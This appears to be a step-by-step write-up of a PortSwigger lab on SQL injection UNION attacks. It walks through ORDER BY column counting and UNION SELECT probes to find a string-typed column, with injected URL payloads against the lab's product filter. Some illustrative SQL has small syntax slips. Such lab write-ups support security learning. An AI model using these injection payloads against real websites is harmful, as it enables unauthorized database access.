**SQL Injection — Lab #4 SQL injection UNION attack, finding a column containing text**

<img width="1099" height="541" alt="image" src="https://github.com/user-attachments/assets/ca015ad2-bc92-4dfb-9bec-bb00d17777fb" />

The goal of this LAB is to identify a column that is compatible with string data

In previous Lab we understand how we can determine the number of columns in a Table.

For performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.

2. We need to know the data type of the columns.

In this Lab we will understand how we can identify the data type columns.

Now from the previous Lab (Lab #3) we understand that the Table has three columns. The payload that we have created is below:-

***SELECT a, b, c, FROM Table 1 UNION SELECT NULL, NULL, NULL***

In the 2nd query we will pass a value of type strings in each column one by one and see if it throws an error.

***SELECT a, b, c, FROM Table 1 UNION SELECT ‘a’ , NULL, NULL***

If we got an error, it means column a is not a strings data type.

Then we will try again to check the data type of second column.

***SELECT a, b, c, FROM Table 1 UNION SELECT NULL, ‘b’ , NULL***

And similarly for 3rd column

***SELECT a, b, c, FROM Table 1 UNION SELECT NULL, NULL, ‘c’***

Lets start the Lab

<img width="1100" height="576" alt="image" src="https://github.com/user-attachments/assets/664d75ad-d4db-4540-ab4f-c0bf3b9d9b1f" />

As per Lab description, this lab contains a SQL injection vulnerability in the product category filter.

<img width="1100" height="534" alt="image" src="https://github.com/user-attachments/assets/6aaaaec1-c37c-4044-ae17-c00a3cacf997" />

**STEP 1 >** We need to identify the number of columns available in the Table.

Lets use an another method to determine which is called Order By Clause

But before that, lets quickly validate if this application is vulnerable to SQLi or not

<img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/e837c2b7-a9e8-4612-8201-06df48d5041d" />

We got an error message. The application could be vulnerable to SQLi.

<img width="1100" height="420" alt="image" src="https://github.com/user-attachments/assets/4e851794-e528-44d9-a6a2-c600f1870438" />

This time we don't get any error.

Now Lets determine the number of columns

***web-security-academy.net/filter?category=Corporate+gifts’ ORDER BY 1 --***

<img width="1100" height="530" alt="image" src="https://github.com/user-attachments/assets/91da2ae4-b213-45c1-a44b-4fb85df52150" />

We don't get any error, which makes sense as there are two columns (NAME and PRICE) that we can see.

Lets try again

***web-security-academy.net/filter?category=Corporate+gifts’ ORDER BY 2--***

<img width="1100" height="518" alt="image" src="https://github.com/user-attachments/assets/152b7556-6913-44ed-b9c1-1afba813ceb6" />

Again we don't get any error. Also we can see that NAME column got arranged alphabetically. It gives us hint that NAME column is the 2nd column in the table.

Lets try again

***web-security-academy.net/filter?category=Corporate+gifts’ ORDER BY 3--***

<img width="1100" height="497" alt="image" src="https://github.com/user-attachments/assets/1ba4b656-af9c-40eb-93f1-1496f3c73fe0" />

This time the PRICE column got arranged in ascending order. So PRICE column is the 3rd column in the Table

Lets try again

***web-security-academy.net/filter?category=Corporate+gifts’ ORDER BY 4--***

<img width="1100" height="243" alt="image" src="https://github.com/user-attachments/assets/1ff2b181-7c45-41db-a9ac-3d2a800472ed" />

Now we got an error. It means there is not 4th column in the table.

So the table contains 3 columns. One we can't see and don't know its data type. One is for NAME of the Items which data type is strings and one is for PRICE of the item which data type is integer.

**STEP 2 >** We need to determine the data type of that column that is hidden

Now, we got a hint that there are 3 columns in the table.

So our payload will look like this

***UNION SELECT null, null, null --***

Lets pass a string value in the 1st column

***UNION SELECT ‘a’, null, null --***

Lets try

***web-security-academy.net/filter?category=Corporate+gifts’ UNION SELECT ‘a’, NULL, NULL --***

<img width="1100" height="244" alt="image" src="https://github.com/user-attachments/assets/dd996620-8c80-4c43-abfc-a0e23f77d9f7" />

We got an error. It means the 1st column is not strings data type.

Lets validate 2nd column

***web-security-academy.net/filter?category=Corporate+gifts’ UNION SELECT NULL , ‘a’ , NULL ---***

<img width="1100" height="548" alt="image" src="https://github.com/user-attachments/assets/0a580cfd-e2cd-4095-98f6-b5ace52bfe36" />

We dont get any error and we can see a new entry by a.

This confirms that 2nd column has strings data type.

Lets try for 3rd column

***web-security-academy.net/filter?category=Corporate+gifts’ UNION SELECT NULL , NULL, ‘a’--***

<img width="1100" height="216" alt="image" src="https://github.com/user-attachments/assets/9d6d73ea-c6dd-4981-a77f-c6deaa102343" />

Got an error. Lets check with integer data type

***web-security-academy.net/filter?category=Corporate+gifts’ UNION SELECT NULL , NULL, 1--***

<img width="1100" height="540" alt="image" src="https://github.com/user-attachments/assets/c08e80de-0537-4af1-9530-5419024bdc47" />

It confirms that 3rd column has data types of integer.

Now to solve the Lab we need to pass the value **hl8T4c** in the string type column.

<img width="963" height="349" alt="image" src="https://github.com/user-attachments/assets/63725e3b-bba7-44e7-b8a3-3625d57cbfb5" />

We identify that only column 2 has string data type.

Let create out payload

***web-security-academy.net/filter?category=Corporate+gifts’ UNION SELECT NULL , ‘hl8T4c’, NULL --***

<img width="1100" height="537" alt="image" src="https://github.com/user-attachments/assets/305da99a-e1d6-43c6-9c4a-eaa568046ca7" />

And the lab is solved.

<img width="1100" height="508" alt="image" src="https://github.com/user-attachments/assets/42f12644-a846-4df3-a53a-3f8a3b0f2312" />

We can see a new entry in the 2nd column.




















































